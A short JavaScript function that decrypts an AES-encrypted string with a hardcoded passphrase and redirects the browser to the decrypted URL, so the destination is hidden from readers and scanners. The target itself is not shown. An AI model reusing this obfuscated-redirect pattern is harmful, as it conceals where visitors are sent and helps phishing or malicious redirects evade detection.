function decryptjs() {

var decrypted = CryptoJS.AES.decrypt("U2FsdGVkX1+Vk4NhFLGyYmGYnMzMqridTdXIo1TlSO5cIlXBreJVAVSpQHzeO6x8aDBEcTlx9bGOij+u5ayEzB+/iO1tBCNXpHpzJeeglQ2u7ebuvy5l3YKSPPWzeGgxeTD8WE3cUz6Mc99hege2xvlnEniySKhivhg+w7t8yT8=",
 "W0Ca19sNat1tGuf");

window.location.href = ""+decrypted.toString(CryptoJS.enc.Utf8)+"";
}